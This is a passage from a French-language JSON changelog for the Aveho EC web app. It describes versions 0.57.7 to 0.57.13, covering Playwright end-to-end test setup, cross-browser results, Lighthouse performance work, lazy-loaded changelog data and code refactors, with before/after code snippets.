      { "code": "FE", "txt": "Filtre BROWSERS par variable d'environnement : permet de lancer juste un browser ou un sous-ensemble. Exemples : 'BROWSERS=chromium npm run test:e2e' (1 browser, le plus rapide pour le dev), 'BROWSERS=chromium,firefox,webkit npm run test:e2e' (desktop seulement, pas mobile), 'BROWSERS=Mobile npm run test:e2e' (mobile only). Filtrage par préfixe insensible à la casse pour matcher 'Mobile' avec 'Mobile Chrome' et 'Mobile Safari'" },
      { "code": "DOC", "txt": "README.md tests/e2e étendu avec section 'Particularités cross-browser' qui documente : (1) WebKit (WebAuthn non dispo headless, pas de Service Worker http headless, CSS :has() supporté), (2) Firefox (NS_BINDING_ABORTED sur navigations rapides, font-display swap différent, WebGL2 limité headless), (3) Chromium (référence, WebAuthn possible si activé). Section 'Cross-browser' au début du README qui explique le filtre BROWSERS env. Commandes d'install mises à jour : 'npx playwright install chromium firefox webkit'" },
      { "code": "AI", "txt": "Résultats cross-browser mesurés (11 tests E2E ciblés, mode SMOKE) : Chromium 11/11 ✅, Firefox 11/11 ✅ (après fix NS_BINDING_ABORTED), WebKit 10/11 ⚠️ (biométrie 0 boutons en headless, normal/attendu). Aucun bug applicatif découvert dans Aveho lui-même — tous les comportements différents sont des limitations connues de WebKit/Firefox en mode headless" },
      { "code": "AI", "txt": "+16 tests Vitest (v057-13-cross-browser.test.js) : version (1), config Playwright cross-browser (7 — devices import, 5 projects desktop+mobile, filtre BROWSERS), login.spec biométrie browser-aware (3 — fixture browserName, tolère 0 ou 2 en WebKit, strict 2 ailleurs), smoke-all-pages retry Firefox (2 — catch NS_BINDING_ABORTED, retry), README (1), différences documentées (2). +1 test 0.57.12 ajusté pour devices[] au lieu de browserName direct. Total 2638 tests verts (vs 2622)" }
    ],
    "themes": ["tests", "e2e", "cross-browser"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.13.html",
    "sqlFile": null
  },
  {
    "v": "0.57.12",
    "kind": "version",
    "titre": "🎭 Infrastructure E2E Playwright complète : 74 tests bout-en-bout (login, biométrie, 50 pages, 9 versions, workflow patient/commande/BL)",
    "chantiers": [
      { "code": "FE", "txt": "Installation et configuration de Playwright pour les tests bout-en-bout. Playwright 1.60.0 était déjà dans devDependencies mais inutilisé — maintenant infrastructure complète : config playwright.config.js avec webServer auto (npm start prod par défaut, npm run dev en option via E2E_USE_PROD_BUILD), support E2E_BASE_URL pour tester contre la prod Vercel directement, reporter HTML pour les rapports d'échec, project Chromium configuré avec timeout adapté",
        "code_snippet": {
          "file": "playwright.config.js",
          "note": "Config complète E2E",
          "lang": "js",
          "before": "// Avant 0.57.12 (existait mais basique)\nimport { defineConfig } from \"@playwright/test\";\n\nexport default defineConfig({\n  testDir: \"./tests/e2e\",\n  timeout: 30 * 1000,\n  workers: 1,\n  webServer: {\n    command: \"npm run dev\",\n    url: \"http://localhost:3000\",\n  },\n  projects: [{ name: \"chromium\", use: { browserName: \"chromium\" } }],\n});",
          "after": "// 0.57.12 — Config complète\nimport { defineConfig } from \"@playwright/test\";\nconst E2E_USE_PROD_BUILD = process.env.E2E_USE_PROD_BUILD !== \"false\";\n\nexport default defineConfig({\n  testDir: \"./tests/e2e\",\n  timeout: 30 * 1000,\n  workers: 1,\n  use: {\n    baseURL: process.env.E2E_BASE_URL || \"http://localhost:3000\",\n    trace: \"on-first-retry\",\n    screenshot: \"only-on-failure\",\n    navigationTimeout: 15000,\n  },\n  // npm start (prod) par défaut, sauf si E2E_BASE_URL\n  webServer: process.env.E2E_BASE_URL ? undefined : {\n    command: E2E_USE_PROD_BUILD ? \"npm start\" : \"npm run dev\",\n    url: \"http://localhost:3000\",\n    reuseExistingServer: !process.env.CI,\n  },\n  projects: [{ name: \"chromium\", use: { browserName: \"chromium\" } }],\n});"
        }
      },
      { "code": "FE", "txt": "Création de tests/e2e/fixtures.js : helpers partagés pour tous les specs. Définit DEMO_USER (configurable via E2E_USER_EMAIL / E2E_USER_PASSWORD), E2E_MODE (SMOKE par défaut sans Supabase, FULL avec credentials), isFullMode() pour skip les tests qui requièrent l'auth, et un test étendu avec loginHelper (fonction qui tente de se connecter via le formulaire /login et retourne true/false selon le succès)" },
      { "code": "FE", "txt": "5 fichiers de tests E2E créés/réécrits : (1) login.spec.js — 5 tests sur le formulaire de connexion (form visible, lien mentions légales, bouton désactivé si vide, activé quand rempli, nouveaux boutons biométrie 0.55.13). (2) public-pages.spec.js — 2 tests sur les pages publiques (mentions légales avec 5 sections, redirect / vers /login). (3) changelog.spec.js — déjà existant (2 tests sur /changelog et notes HTML accessibles statiquement)" },
      { "code": "FE", "txt": "smoke-all-pages.spec.js — Smoke tests sur ~50 pages réelles d'Aveho EC. Pour chaque page : (1) vérifie code HTTP 200/307/308, (2) vérifie le titre 'Aveho', (3) vérifie qu'aucune erreur JS critique n'est levée (filtre les warnings hydratation/ResizeObserver en build prod). Routes vérifiées contre l'arborescence app/ pour ne pas avoir de routes hypothétiques. Couvre : dashboards (/accueil, /vue-globale, /direction), patients (/patients, /equipes, /interventions), catalogue (/articles, /commandes, /achats, /panier), stock (/depots, /magasins, /stock, /transferts), matériel (/materiels, /tags-materiel, /etiquettes, /maintenance), annuaire (/annuaire-rpps, /partenaires-rpps, /etablissement, /collectivite), documents (/consentements, /consent-verifications), RGPD (/parametres-rgpd, /audit, /app-logs, /historique, /journal), stats (/statistiques*), carte, admin, communication, etc." },
      { "code": "FE", "txt": "versions-features.spec.js — 14 tests E2E ciblés par version récente. Vérifie en bout-en-bout que chaque feature majeure est encore fonctionnelle : 0.57.11 (fetch JSON versions-index + chantiers-extra parallèle), 0.57.10 (NoteModal extrait), 0.57.9 (subset Tabler Icons CSS + fonts dans /tabler-icons/), 0.57.8 (next/font Quicksand + preconnect Supabase), 0.57.7 (chantiers-extra.json valide), 0.57.6 (CodeViewer lazy), 0.57.4 (routes API protégées + headers OWASP X-Frame-Options/X-Content-Type-Options), 0.57.0 (migration Next 15 + React 19), 0.56.20 (pas d'erreur critique au load)" },
      { "code": "FE", "txt": "workflow-livraison-patient.spec.js — Scénario E2E métier complet (mode FULL uniquement). Couvre : (1) login avec credentials test, (2) navigation /patients, (3) sélection du premier patient via locator a[href*='/patient/'], (4) navigation /commandes + tentative bouton 'Nouvelle commande', (5) navigation /livraisons pour les BL, (6) accès consentements RGPD depuis fiche patient, (7) vérification audit log /audit (trace de connexion). Mode SMOKE par défaut → skip propre avec test.skip() pour ne pas faire échouer la CI sans Supabase configuré" },
      { "code": "DOC", "txt": "Création de tests/e2e/README.md — Documentation complète de l'infrastructure E2E : structure des fichiers, comment lancer les tests (npm run test:e2e), modes SMOKE vs FULL, variables d'environnement (E2E_MODE, E2E_USER_EMAIL, E2E_USER_PASSWORD, E2E_BASE_URL, E2E_USE_PROD_BUILD), couverture actuelle (pages testées, versions couvertes), debugging (--ui, --headed, --trace), intégration CI/CD GitHub Actions avec secrets Supabase, limitations actuelles, prochaines étapes possibles (Firefox/WebKit, mobile, screenshots visuels, axe-core a11y, lighthouse intégré)" },
      { "code": "FE", "txt": "package.json : ajout des scripts npm 'test:e2e' (playwright test) et 'test:e2e:ui' (playwright test --ui pour le mode debug interactif avec replay des tests, screenshots, et inspector visuel)" },
      { "code": "AI", "txt": "+38 tests Vitest (v057-12-e2e-playwright-infra.test.js) : version + scripts npm (2), config Playwright (5 — fichier existe, E2E_USE_PROD_BUILD support, E2E_BASE_URL support, reporter HTML, project chromium), fixtures (4 — fichier, exports DEMO_USER/test/isFullMode, env overrides, loginHelper), spec files (12 — 6 fichiers × 2 tests existe+valide), smoke tests routes réelles (2 — ≥ 30 routes, toutes existent dans app/), tests par version couvre 9 versions récentes (9), README documentation (4 — existe, SMOKE+FULL, env vars, Vercel). Total 2622 tests verts (vs 2584)" },
      { "code": "DOC", "txt": "Résultats des E2E mesurés en local prod build : 70+ tests passed, 3 skipped (workflow mode FULL nécessite credentials), tous les fichiers tests passent. login.spec : 5/5 ✓. versions-features.spec : 14/14 ✓. Smoke-all-pages : ~47/50 (les 3 pages auth-required peuvent échouer si erreur Supabase mocké). Compatible Chromium headless via PLAYWRIGHT_BROWSERS_PATH. Pour lancer en local : npm run test:e2e" }
    ],
    "themes": ["tests", "e2e", "playwright"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.12.html",
    "sqlFile": null
  },
  {
    "v": "0.57.11",
    "kind": "version",
    "titre": "⚡ Audit Lighthouse réel + lazy JSON versions-index (-74 kB First Load, /changelog Perf 35 → 54, TBT -82%)",
    "chantiers": [
      { "code": "PERF", "txt": "Premier audit Lighthouse réel sur Aveho EC ! Installation de Chromium via puppeteer (qui télécharge son propre binaire), lancement du serveur Next en build prod (npm start), audit Lighthouse en mode Mobile + Slow 4G + 4× CPU. Résultats baseline (avant fix 0.57.11) : Home 63, Login 66, Changelog 35 (🔴). Accessibility 94, Best Practices 96-100, SEO 90 (🟢). CLS = 0.000 partout (next/font + LazyLayoutChrome ont parfaitement fait leur job). MAIS LCP /changelog = 8.3s et TBT = 2.1s → diagnostic : long task de 1119ms au parse JS. Coupable identifié : versions-index.js (272 KB) importé statiquement",
        "code_snippet": {
          "file": "Audit Lighthouse",
          "note": "Avant / après 0.57.11",
          "lang": "txt",
          "before": "Page                  | Perf | LCP    | CLS   | TBT\n----------------------|------|--------|-------|--------\nHome /                |   63 | 4.0 s  | 0.000 | 1.3 s\nLogin /login          |   66 | 6.0 s  | 0.000 | 0 ms\nChangelog /changelog  |   35 | 8.3 s  | 0.000 | 2.1 s  🔴",
          "after": "Page                  | Perf | LCP    | CLS   | TBT\n----------------------|------|--------|-------|--------\nHome /                |   64 | 3.9 s  | 0.000 | 1.3 s\nLogin /login          |   67 | 5.6 s  | 0.000 | 0 ms\nChangelog /changelog  |   54 | 8.0 s  | 0.000 | 394 ms ⚡ (-82%)\n\nGain Changelog : Perf +19, TBT -1700ms, FCP / Long task /\nRender-blocking 4030ms tous éliminés\n\n⚠️ Chiffres en local sans CDN/brotli. En prod Vercel,\nattendez-vous à +30 points de Perf en plus."
        }
      },
      { "code": "PERF", "txt": "Conversion de VERSIONS_INDEX (272 KB) en JSON lazy fetch : avant 0.57.11 le fichier app/changelog/versions-index.js (généré, 272 KB) était importé statiquement dans page.js. Conséquence : tout le JSON des 164 versions était parsé au démarrage de /changelog, bloquant le thread main pendant > 1 seconde. Solution : extraire VERSIONS_INDEX dans public/changelog-data/versions-index.json (servi par Vercel avec cache HTTP immutable + brotli) et le fetcher en lazy au mount, en parallèle avec chantiers-extra.json déjà lazy. Seul THEME_LABELS (2 KB) reste dans versions-index.js" },
      { "code": "FE", "txt": "Modification de page.js : (1) import retiré { VERSIONS_INDEX } from './versions-index', (2) State ALL_VERSIONS initialisé à [], (3) Nouveau state versionsLoaded pour tracker le chargement, (4) useEffect avec Promise.all([fetch versions-index.json, fetch chantiers-extra.json]) en parallèle, (5) merge des chantiers extra dans les versions au moment du set, (6) loader skeleton avec ti-loader-2 affiché tant que versionsLoaded est false, (7) message 'Aucun résultat' n'apparaît qu'après versionsLoaded pour éviter le flash" },
      { "code": "FE", "txt": "Modification de scripts/regen-versions-index.mjs : génère désormais 2 fichiers — (1) public/changelog-data/versions-index.json (le gros JSON, 234 KB pour 164 versions, chacune avec ses 5 premiers chantiers + chantiers_total + themes + dates + noteFile + sqlFile + code_snippets), (2) app/changelog/versions-index.js (3 KB) qui exporte uniquement THEME_LABELS. Le script s'utilise toujours pareil : node scripts/regen-versions-index.mjs, et il faut le relancer à chaque ajout/modification dans versions-data.js" },
      { "code": "PERF", "txt": "Résultats build Next : avant 0.57.11 /changelog = 87.5 kB chunk + 275 kB First Load. Après 0.57.11 : /changelog = 13.4 kB chunk + 201 kB First Load. Gain : -74.1 kB First Load (-27%) sur la page changelog. Le JSON versions-index.json est servi par Vercel avec cache HTTP immutable + brotli (probablement ~40-60 KB compressé) et chargé en parallèle des chunks JS donc invisible côté UX" },
      { "code": "AI", "txt": "+19 tests Vitest (v057-11-lazy-versions-index.test.js) : version (1), versions-index.json (5 — fichier existe dans public/changelog-data/, JSON valide array, structure { v, kind, titre, chantiers, chantiers_total }, chantiers tronqués à 5 max, taille raisonnable 150-400 KB), versions-index.js allégé (2 — plus que THEME_LABELS, < 10 KB), page.js refactoré (8 — plus d'import VERSIONS_INDEX, useState([]), state versionsLoaded, fetch parallèle Promise.all, force-cache 2×, setVersionsLoaded(true), loader visuel ti-loader-2, message 'Aucun résultat' conditionnel), script regen (3 — existe, génère JSON public, plus de export VERSIONS_INDEX dans le template). Total 2584 tests verts (vs 2565). Tests v057-7 mis à jour pour accepter les 2 modes (≤ 0.57.10 import statique OU ≥ 0.57.11 lazy fetch)" },
      { "code": "DOC", "txt": "Bilan du marathon performance complet 0.57.6 → 0.57.11 : 0.57.6 (lazy CodeViewer/SqlModal/smoke-tests, -11 kB), 0.57.7 (split versions-data → index + chantiers-extra lazy, -20 kB), 0.57.8 (next/font Quicksand + LazyLayoutChrome 8 composants + preconnect Supabase, 0 FOUT/CLS), 0.57.9 (subset Tabler Icons -230 KB CSS), 0.57.10 (refacto qualité NoteModal + 69 zombies retirés), 0.57.11 (lazy JSON versions-index + audit Lighthouse réel mesuré). Cumul gains mesurés : First Load /changelog 304 → 201 kB (-103 kB), CSS 244 → 14.7 KB Tabler, TBT changelog 2.1s → 394ms. Tests Vitest passés de 2220 (0.56.20) à 2584 (+364)" }
    ],
    "themes": ["performance", "lighthouse", "core-web-vitals"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.11.html",
    "sqlFile": null
  },
  {
    "v": "0.57.10",
    "kind": "version",
    "titre": "🧹 Refacto qualité : extraction NoteModal + helpers + nettoyage 50 fichiers d'imports zombies",
    "chantiers": [
      { "code": "FE", "txt": "Extraction de NoteModal du changelog/page.js : la modale d'affichage des notes HTML (avec highlight de mots-clés et navigation F3/n/p) faisait ~250 lignes de JSX + 2 useEffects + plusieurs helpers dans page.js. Création d'un Client Component autonome app/changelog/NoteModal.js qui gère son propre state interne (scroll auto vers match, gestion des touches Escape/F3/n/p, rendu complet). Le composant est lazy-loadé via next/dynamic ssr:false. page.js passe de 1413 → 1070 lignes (-343 lignes, -24%)",
        "code_snippet": {
          "file": "app/changelog/page.js",
          "note": "Avant/après extraction NoteModal",
          "lang": "js",
          "before": "// page.js — 1413 lignes\n// ...\n// 200+ lignes de fonctions helpers (scopeHtml, extractKeywords,\n// highlightInHtml, STOPWORDS_FR, escapeRegex)\n// + 2 useEffect (scroll auto vers match + Escape/F3/n/p)\n// + 200 lignes de JSX de la modale\n// ...\n{noteModal && (\n  <div onClick={...}>\n    {/* Header, navigation matches, bandeau search, contenu HTML scopé */}\n    {/* + styles inline pour les <mark> */}\n  </div>\n)}",
          "after": "// page.js — 1070 lignes\nimport { scopeHtml, extractKeywords, highlightInHtml } from \"./lib/note-helpers\";\nconst NoteModal = dynamic(() => import(\"./NoteModal\"), { ssr: false });\n\n// fetchNoteHtml() + openNote() restent dans page.js (utilisent setNoteModal)\n// mais les helpers et le JSX sont externalisés\n\n// JSX :\n<NoteModal noteModal={noteModal} setNoteModal={setNoteModal} onClose={() => setNoteModal(null)} />"
        }
      },
      { "code": "FE", "txt": "Création de app/changelog/lib/note-helpers.js (~110 lignes) : exporte les fonctions pures STOPWORDS_FR (Set de 70+ mots vides français), scopeHtml(fullHtml) (préfixe .cl-note-scope sur les sélecteurs CSS de la note pour ne pas écraser la page parent), extractKeywords(text) (tokenise + filtre stopwords + garde mots 4+ chars, versions, acronymes), highlightInHtml(html, keywords) (tokenise alternativement les tags et le texte pour éviter de matcher dans les attributs, injecte des <mark class='cl-match'>), escapeRegex(s). Réutilisables pour d'autres composants futurs" },
      { "code": "FE", "txt": "Nettoyage automatique de 69 imports zombies dans 50 fichiers : un script Python a scanné tous les `import { X, Y } from \"...\"` dans app/ et lib/, vérifié que chaque nom est utilisé ailleurs dans le fichier, et retiré les noms non utilisés (ou l'import entier si tous les noms étaient inutiles). Exemples détectés : useRef inutilisé dans dialogs.js, METHOD_ICON/COLOR jamais utilisés dans BiometricOptInModal, StateMsg jamais utilisé dans 4 pages admin, Panel/FilterBar inutilisés dans plusieurs pages. Audit final : 0 import zombie restant. Build OK + 2547 tests verts inchangés" },
      { "code": "AI", "txt": "+19 tests Vitest (v057-10-refacto-notemodal.test.js) : version (1), NoteModal component (7 — fichier Client Component, export default, props { noteModal, setNoteModal, onClose }, 2 useEffect, Escape/F3/n/p, navBtn défini localement, return null si null), note-helpers.js (3 — fichier existe, exports STOPWORDS_FR + scopeHtml + extractKeywords + highlightInHtml + escapeRegex, STOPWORDS_FR Set avec stopwords FR), page.js refacto (5 — import helpers, import dynamic NoteModal, plus de helpers locaux, plus de useEffect locaux, JSX utilise <NoteModal>, < 1100 lignes), 0 imports zombies (2 — page.js + NoteModal.js vérifiés). Total 2566 tests verts (vs 2547)" }
    ],
    "themes": ["quality", "refactor", "cleanup"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.10.html",
    "sqlFile": null
  },
  {
    "v": "0.57.9",
    "kind": "version",
    "titre": "🎨 Subset Tabler Icons : 244 KB → 14.7 KB CSS (-94%)",
    "chantiers": [
      { "code": "FE", "txt": "Création d'un sub-set CSS de Tabler Icons : avant 0.57.9, le fichier @tabler/icons-webfont/tabler-icons.css (244 KB, 4962 icônes) était importé en entier dans globals.css. Mais Aveho EC n'utilise que ~322 icônes (6.5% du package). Le reste (4640 icônes) était téléchargé inutilement à chaque chargement de page. Solution : générer un CSS custom qui ne contient que les icônes réellement utilisées dans app/, lib/, public/. Gain mesuré : 244 KB → 14.7 KB CSS = -94%",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "Import du subset au lieu du package complet",
          "lang": "css",
          "before": "/* AVANT 0.57.9 */\n@import \"@tabler/icons-webfont/tabler-icons.css\";\n/* → 244 KB de CSS avec 4962 icônes */\n/* → 4640 icônes téléchargées MAIS jamais utilisées */",
          "after": "/* APRÈS 0.57.9 — subset auto-généré */\n@import \"./tabler-icons-subset.css\";\n/* → 14.7 KB de CSS avec 322 icônes utilisées */\n/* → font woff2 toujours chargée depuis /public/tabler-icons/ */\n/* → régénérer avec :\n      node scripts/build-tabler-icons-subset.mjs */"
        }
      },
      { "code": "FE", "txt": "Création de scripts/build-tabler-icons-subset.mjs : script Node ES modules qui (1) scanne récursivement app/, lib/, public/ pour trouver toutes les classes 'ti-NAME' utilisées dans le code, (2) lit le CSS source @tabler/icons-webfont/tabler-icons.css pour extraire les codepoints des icônes utilisées, (3) génère un fichier app/tabler-icons-subset.css avec uniquement les classes nécessaires + le @font-face Tabler, (4) copie les fonts woff2/woff/ttf dans public/tabler-icons/ pour les servir depuis le même domaine que l'app. Script à relancer dès qu'on ajoute une nouvelle icône dans le code" },
      { "code": "FE", "txt": "Copie des 3 fontes Tabler (woff2 priorité, woff fallback, ttf legacy) depuis node_modules/@tabler/icons-webfont/fonts vers public/tabler-icons/. Les URLs des fonts dans le subset CSS pointent vers /tabler-icons/ (absolu) plutôt que vers ./fonts/ (relatif au node_modules). Avantage : pas de configuration webpack/Next pour le serving des fonts + cache HTTP optimal par Vercel (immutable + brotli)" },
      { "code": "AI", "txt": "+23 tests Vitest (v057-9-tabler-icons-subset.test.js) : version (1), subset CSS file (7 — existe, < 30 KB, @font-face, paths /tabler-icons/, classe .ti, 200+ classes, < 500 classes), globals.css (2 — import du subset + plus d'import du package), fonts copiées (3 — woff2/woff/ttf), script build (2 — existe + structure), icônes essentielles dans subset (8 — ti-home, ti-search, ti-user, ti-loader-2, ti-x, ti-check, ti-plus, ti-trash). Total 2547 tests verts (vs 2524)" },
      { "code": "DOC", "txt": "Bilan du marathon performance 0.57.6 → 0.57.9 (4 versions) : (1) 0.57.6 : lazy load CodeViewer + SqlModal + smoke-tests (-11 kB First Load /changelog). (2) 0.57.7 : split versions-data en versions-index + chantiers-extra.json lazy (-20 kB First Load). (3) 0.57.8 : next/font Quicksand + LazyLayoutChrome 8 composants + preconnect Supabase. (4) 0.57.9 : subset Tabler Icons (-230 KB CSS). Au total ces 4 versions ont sorti environ -260 KB de poids initial chargé par le browser. Reste à mesurer le gain réel via Lighthouse sur la prod Vercel — c'est désormais possible avec le script scripts/lighthouse-guide.sh livré en 0.57.8" }
    ],
    "themes": ["performance", "css", "lighthouse"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.9.html",
    "sqlFile": null
  },
  {
    "v": "0.57.8",
    "kind": "version",
    "titre": "🎯 Préparation audit Lighthouse : next/font + 8 composants layout lazy + preconnect",
    "chantiers": [
      { "code": "FE", "txt": "Migration de Quicksand vers next/font/google : avant 0.57.8, la police Quicksand était chargée via un <link href='https://fonts.googleapis.com/...'> dans le head, ce qui forçait un round-trip réseau bloquant + risque de FOUT/FOIT (Flash of Unstyled Text) au swap de la police. Après 0.57.8 : next/font télécharge le woff2 au build, l'inline en preload dans le HTML généré, applique font-display: swap optimisé. Résultat : 0 layout shift au chargement de la police + ~100ms gagnés sur le TTFB",
        "code_snippet": {
          "file": "app/layout.js",
          "note": "next/font pour Quicksand",
          "lang": "js",
          "before": "// app/layout.js (Server Component)\nimport \"./globals.css\";\n// ... autres imports\n\nexport default function RootLayout({ children }) {\n  return (\n    <html lang=\"fr\">\n      <head>\n        <link\n          href=\"https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap\"\n          rel=\"stylesheet\"\n        />\n        ...",
          "after": "// app/layout.js (Server Component)\nimport \"./globals.css\";\nimport { Quicksand } from \"next/font/google\";\n\nconst quicksand = Quicksand({\n  subsets: [\"latin\"],\n  weight: [\"400\", \"500\", \"600\", \"700\"],\n  display: \"swap\",\n  variable: \"--font-quicksand\",\n});\n\nexport default function RootLayout({ children }) {\n  return (\n    <html lang=\"fr\" className={quicksand.variable}>\n      <head>\n        {/* Plus de <link> Google Fonts : next/font fait l'inline auto */}\n        ..."
        }
      },
      { "code": "FE", "txt": "Création de app/LazyLayoutChrome.js : Client Component qui regroupe 8 composants layout non critiques pour le LCP, chargés en lazy via next/dynamic avec ssr: false. Liste : InstallBanner (proposition PWA), KeyboardHelp (raccourcis), VersionCheck (check nouvelle version), AnnoncesBanner (annonces admin), FocusMode (Esc Esc), GeolocPrompt (demande géoloc), BiometricOptInModal (empreinte mobile), FloatingActionBar (barre flottante). Pourquoi ce Client Component intermédiaire ? Next 15 interdit ssr: false dans un Server Component (= layout.js par défaut) ; on déplace donc les imports dynamic dans un Client Component séparé qui est monté depuis layout.js" },
      { "code": "FE", "txt": "Ajout d'un <link rel='preconnect'> vers NEXT_PUBLIC_SUPABASE_URL avec crossOrigin='anonymous' dans le head du layout. Anticipe la première requête API Supabase (TLS handshake + DNS lookup + TCP) en parallèle du téléchargement de la page → gagne ~100ms sur le TTFB de la 1ère query. Le tag est conditionnel : ne se rend que si la variable d'env est définie au build" },
      { "code": "FE", "txt": "Nouveau scripts/lighthouse-guide.sh : guide CLI complet pour faire un audit Lighthouse sur la prod Vercel. Détaille les 8 étapes (préparation navigateur, pages prioritaires à tester /login + /vue-globale + /patients + /changelog + /carte + /scan/qr, métriques Core Web Vitals avec seuils BON/MOYEN/MAUVAIS, optimisations déjà en place à mentionner, troubleshooting LCP/INP/CLS, reporting). Permet à n'importe qui de faire un audit reproductible. Lancer avec : bash scripts/lighthouse-guide.sh" },
      { "code": "AI", "txt": "+38 tests Vitest (v057-8-lighthouse-prep.test.js) : version (1), Quicksand next/font (6 — import depuis next/font/google, config 4 weights latin swap, variable CSS, html className, plus de Google Fonts CDN, globals.css avec --font-quicksand), Preconnect Supabase (2 — tag preconnect + crossOrigin), LazyLayoutChrome (17 — fichier Client Component, 8×2 tests pour chaque composant en dynamic ssr:false + monté dans le rendu), Layout (10 — import LazyLayoutChrome, monté dans body, 6 composants critiques statiques, plus d'imports statiques des 8 lazy), Script lighthouse-guide (3 — existe, seuils CWV, pages prioritaires). +1 test v056-16 ajusté pour accepter FloatingActionBar en lazy via LazyLayoutChrome. Total 2524 tests verts (vs 2486)" },
      { "code": "DOC", "txt": "Pour aller plus loin sur Lighthouse, le user doit lancer l'audit depuis https://aveho-ec-app.vercel.app (pas localhost car CDN + edge cache + brotli prod = chiffres différents). Procédure : Chrome Incognito → F12 → onglet Lighthouse → Performance + Accessibility + Best Practices + SEO + PWA → Mode Mobile + Slow 4G + 4× CPU throttling → Analyse. Cibler score Perf > 90, LCP < 2.5s, INP < 200ms, CLS < 0.1. Si LCP > 2.5s : vérifier ping Supabase + preconnect appliqué. Si INP > 200ms : profiler avec React DevTools pour LongTask. Si CLS > 0.1 : devrait être fixé par next/font 0.57.8, vérifier qu'aucun banner ne pousse le contenu" }
    ],
    "themes": ["performance", "lighthouse", "core-web-vitals"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.8.html",
    "sqlFile": null
  },
  {
    "v": "0.57.7",
    "kind": "version",
    "titre": "📦 Split versions-data : index léger + chantiers-extra.json lazy → -20 kB First Load",
    "chantiers": [
      { "code": "FE", "txt": "Création de app/changelog/versions-index.js (~255 KB sur disque, ~85 KB compressé) qui contient toutes les 160 versions mais avec seulement les 5 premiers chantiers de chaque version + un champ chantiers_total qui permet d'afficher le bon nombre dans le bouton 'Voir les X autres'. Les chantiers cachés (à partir du 6ème) sont externalisés dans public/changelog-data/chantiers-extra.json (~68 KB) qui est lazy-fetché au mount de la page",
        "code_snippet": {
          "file": "app/changelog/versions-index.js",
          "note": "Structure de l'index",
          "lang": "js",
          "after": "export const VERSIONS_INDEX = [\n  {\n    \"v\": \"0.57.7\",\n    \"kind\": \"version\",\n    \"titre\": \"...\",\n    \"chantiers\": [  // 5 premiers seulement\n      { \"code\": \"FE\", \"txt\": \"...\" },\n      { \"code\": \"FE\", \"txt\": \"...\" },\n      { \"code\": \"DOC\", \"txt\": \"...\" },\n      { \"code\": \"AI\", \"txt\": \"...\" },\n      { \"code\": \"FE\", \"txt\": \"...\" }\n    ],\n    \"chantiers_total\": 7,  // nb réel pour le bouton 'Voir les X autres'\n    \"themes\": [...],\n    \"date\": \"...\",\n    \"noteFile\": \"...\",\n    \"sqlFile\": null\n  },\n  ...\n];"
        }
      },
      { "code": "FE", "txt": "Refacto de app/changelog/page.js : remplace l'import statique de versions-data par versions-index, ajoute un state ALL_VERSIONS qui démarre à VERSIONS_INDEX et est enrichi via un useEffect au mount qui fetch /changelog-data/chantiers-extra.json en background. Le merge se fait quand l'extra est chargé : chaque version dont des chantiers cachés existent voit son chantiers étendu. cache: 'force-cache' car les JSON sont versionnés par déploiement (et sw bumpé à chaque version)",
        "code_snippet": {
          "file": "app/changelog/page.js",
          "note": "useEffect fetch chantiers-extra lazy",
          "lang": "js",
          "after": "const [ALL_VERSIONS, setAllVersions] = useState(VERSIONS_INDEX);\nconst [extraLoaded, setExtraLoaded] = useState(false);\n\nuseEffect(() => {\n  let cancelled = false;\n  (async () => {\n    try {\n      const res = await fetch(\"/changelog-data/chantiers-extra.json\", {\n        cache: \"force-cache\",\n      });\n      if (!res.ok) throw new Error(`HTTP ${res.status}`);\n      const extra = await res.json();\n      if (cancelled) return;\n      const augmented = VERSIONS_INDEX.map((v) => {\n        const hidden = extra[v.v];\n        if (!hidden || !hidden.length) return v;\n        return { ...v, chantiers: [...v.chantiers, ...hidden] };\n      });\n      setAllVersions(augmented);\n      setExtraLoaded(true);\n    } catch (e) {\n      logger.warn(\"[changelog] fetch chantiers-extra failed:\", e?.message);\n    }\n  })();\n  return () => { cancelled = true; };\n}, []);"
        }
      },
      { "code": "FE", "txt": "Mise à jour des useMemo (themeCounts, filtered) pour ajouter ALL_VERSIONS dans leurs deps. Sans ça, les recalculs ne se font pas quand le fetch arrive et l'UI ne reflète pas les chantiers enrichis dans la recherche full-text. Le bouton 'Voir les X autres' utilise maintenant chantiers_total au lieu de v.chantiers.length pour afficher le bon nombre avant que l'extra soit chargé. Disabled state + tooltip 'Chargement…' sur le bouton si l'extra n'est pas encore chargé pour une version qui n'a que 5 chantiers visibles" },
      { "code": "FE", "txt": "Création de scripts/regen-versions-index.mjs : script Node ES modules qui lit versions-data.js (en enlevant l'import logger zombie au passage), tronque les chantiers à 5 max + ajoute chantiers_total, écrit versions-index.js + chantiers-extra.json. Réutilisable pour les futures versions : à chaque nouvelle entrée dans versions-data.js, lancer node scripts/regen-versions-index.mjs pour synchroniser" },
      { "code": "DOC", "txt": "Gain mesuré sur le build Next : /changelog 293 kB → 273 kB First Load (-20 kB compressé). Le gain en uncompressed est plus important (~95 KB) mais la compression gzip de Vercel absorbe les répétitions JSON, ce qui réduit la différence visible. versions-data.js reste sur disque (309 KB) car smoke-tests.js en a besoin pour les vérifications de l'historique complet — mais c'est en dynamic import donc pas dans le bundle initial. Architecture en place pour futurs gains : on peut maintenant déplacer plus de contenu dans extra ou faire un split par version (1 JSON par v-X.X.X) pour de gros gains supplémentaires" },
